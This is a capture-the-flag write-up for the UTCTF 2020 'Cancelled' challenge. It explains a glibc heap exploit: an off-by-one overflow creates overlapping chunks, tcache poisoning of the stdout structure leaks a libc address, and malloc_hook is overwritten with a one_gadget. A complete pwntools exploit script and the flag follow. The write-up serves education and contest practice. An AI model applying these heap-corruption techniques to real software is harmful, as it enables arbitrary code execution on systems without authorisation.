https://teamrocketist.github.io/2020/03/10/Pwn-UTCTF-2020-Cancelled/

Original writeup (https://teamrocketist.github.io/2020/03/10/Pwn-
UTCTF-2020-Cancelled/).This challenge is similar to the BabyTcache in HITCON CTF 2018.  
The difference in this two task is that BabyTcache use off-by-one null byte
but Cancelled let you to off-by-one any byte.

To solve this task, I use stdout file structure to leak, and write malloc_hook
to one_gadget.

I use unsorted bin to get an address close to stdout structure, and partial
overwrite it to the stdout structure. Becacuse the unsorted bin is circular
double link list, so the last chunk which inserted into the unsorted bin have
an address point to libc on it's fd pointer.

```  
+-----------------------+  
|   chunk 0 size 0x40   |  
+-----------------------+  
|   chunk 1 size 0x500  |  
+-----------------------+  
|   chunk 2 size 0x40   |  
+-----------------------+  
|   chunk 3 size 0x500  |  
+-----------------------+  
|   chunk 4 size 0x80   |  
+-----------------------+  
```  
Chunk4 is used to prevent all chunks are merged to top chunk.  
First we need to use chunk0 to overflow one byte `0x41` to chunk1's `SIZE`, so
we free chunk0 and malloc(0x38) to get chunk0 again and overflow. After do
that, the chunk1's `SIZE` will be change to `0x541`, it will include chunk2.  
Next we free chunk2 to insert it into tcache. And free chunk1 to insert it
into unsorted bin. After this to step, the heap will looks like below.  
```  
+-----------------------+  
|   chunk 0 size 0x40   |  
+-----------------------+--------------------------+  
|   chunk 1 size 0x500  |            unsorted bin  |  
+-----------------------+-------------------+      |  
|   chunk 2 size 0x40   | tcache (overlap)  |      |  
+-----------------------+-------------------+------+  
|   chunk 3 size 0x500  |  
+-----------------------+  
|   chunk 4 size 0x80   |  
+-----------------------+  
```  
Next, we free chunk3. And it will merge chunk1.  
```  
+-----------------------+  
|   chunk 0 size 0x40   |  
+-----------------------+------------------------------+  
|   chunk 1 size 0x500  | unsorted bin (1 chunk)       |  
+-----------------------+-------------------+          |  
|   chunk 2 size 0x40   | tcache (overlap)  |          |  
+-----------------------+-------------------+          |  
|   chunk 3 size 0x500  |                              |  
+-----------------------+------------------------------+  
|   chunk 4 size 0x80   |  
+-----------------------+  
```  
Chunk1,2,3 merged into a single chunk and be put into unsorted bin. Chunk2 is
overlap and in tcache.

Now, free malloc(0x4F8). We will get chunk1 and remain chunk2,3 will be
inserted into unsorted bin again. And chunk2's `fd`,`bk` will be write an
address which in the libc. Notice that the chunk2 is also in tcache now, so
the `fd` pointer is also used by tcache.  
```  
+-----------------------+  
|   chunk 0 size 0x40   |  
+-----------------------+  
|   chunk 1 size 0x500  |  
|                       |   PREV_SIZE   |  
+-----------------------+---------------+-------------------+----------+  
|   chunk 2 size 0x40   |      SIZE     | tcache (overlap)  | unsorted |  
|                       |      FD       |                   | bin      |  
|                       |      BK       |                   |          |  
+-----------------------+-----------------------------------+          |  
|   chunk 3 size 0x500  |                                              |  
+-----------------------+----------------------------------------------+  
|   chunk 4 size 0x80   |  
+-----------------------+  
```  
Next, malloc(0x538) and partial overwrite 2 byte 0x?760 (stdout struct in
offset `0x3ec760`) on `fd` pointer, because of ASLR, we need to brute forsce
?, we have 1/16 chance.  
We can malloc(0x38) twice, to get address which `fd` point.  
If we successfully get the stdout structure, we can write `_flag` to
`0xfbad1800` , `_IO_read_ptr`、`_IO_read_end`、`_IO_read_base` to null and
partial overwrite `_IO_write_base` low byte to null.  
After that, we can leak something.  
After leak libc base, we can overwrite free_hook or malloc_hook or other to
get shell. To overwrite that, use method the same to above.

Explot:  
```python  
from pwn import *  
import os  
r = remote("binary.utctf.live",9050)  
#r = process("./pwnable")

def add(idx, name, desc_len, desc, nomenu = False):  
   print("Add "+hex(desc_len))  
   if nomenu:  
       r.sendline("1")  
   else:  
       r.sendlineafter(">","1")  
   r.sendlineafter("Index: ",str(idx))  
   r.sendlineafter("Name: ",name)  
   r.sendlineafter("Length of description: ",str(desc_len))  
   r.sendafter("Description: ",desc)

def cancel(idx, nomenu = False):  
   if nomenu:  
       r.sendline("2")  
       #r.interactive()  
   else:  
       r.sendlineafter(">","2")  
   r.sendlineafter(": ",str(idx))

add(0, "a", 0x38, "a")  
add(1, "a", 0x4F8, "a")  
add(2, "a", 0x38, "a")  
add(3, "a", 0x4F8, "a")  
add(4, "a", 0x78, "a")  
cancel(0)  
add(0, "a", 0x38, 'a'*0x38+'\x41')  
cancel(2)  
cancel(1)  
cancel(3)  
add(5, "a", 0x4F8, 'a')  
add(6, "a", 0x538, '\x60\xa7')

add(7, "tcache", 0x38, 'a')  
add(8, "stdout", 0x38, p64(0xfbad1800)+b'\x00'*25)

#0x00007f405487c8b0-0x00007f405448f000 = 0x3ED8B0  
res = r.recvuntil(":")  
print(res)  
print(len(res))  
libc = u64(res[8:16])-0x3ed8b0  
print(hex(libc))  
#os.system("cat /proc/"+str(int(input("pid:")))+"/maps")

malloc_hook = libc+0x3ebc30  
one_gadget = libc+0x10a38c

add(0, "a", 0x48, "a",True)  
add(1, "a", 0x4F8, "a",True)  
add(2, "a", 0x48, "a",True)  
add(3, "a", 0x4F8, "a",True)  
add(4, "a", 0x78, "a",True)  
#r.interactive()  
r.recv()  
cancel(0,True)  
add(0, "a", 0x48, 'a'*0x48+'\x51',True)  
cancel(2,True)  
cancel(1,True)  
cancel(3,True)  
add(5, "a", 0x4F8, 'a',True)  
add(6, "a", 0x548, p64(malloc_hook),True)  
add(7, "tcache", 0x48, 'a',True)  
add(8, "malloc_hook", 0x48, p64(one_gadget),True)

#add(10, "shell", 0x87, 'a',True)  
r.recv()

r.sendline("1")  
r.sendlineafter("Index: ","10")  
r.sendlineafter("Name: ","a")  
r.sendlineafter("Length of description: ","10")

r.interactive()  
#utflag{j1tt3rbUg_iS_Canc3l1ed_:(}  
```